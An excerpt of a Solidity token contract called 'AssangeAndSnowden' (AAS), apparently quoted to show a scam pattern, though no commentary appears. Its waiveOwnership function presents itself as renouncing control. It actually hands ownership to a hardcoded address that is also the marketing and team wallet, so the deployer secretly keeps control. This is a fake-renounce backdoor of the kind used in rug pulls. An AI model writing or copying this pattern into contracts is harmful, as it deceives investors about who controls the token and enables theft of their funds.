...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x2f5c7c3779A4F7E00a3e22DF0D3eBd3F350AE436));
        _owner = address(0x2f5c7c3779A4F7E00a3e22DF0D3eBd3F350AE436);
    }
...
contract AssangeAndSnowden is Context, IERC20, Ownable {
    ...
    string private _symbol = "AAS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2f5c7c3779A4F7E00a3e22DF0D3eBd3F350AE436);
    address payable public teamWalletAddress = payable(0x2f5c7c3779A4F7E00a3e22DF0D3eBd3F350AE436);
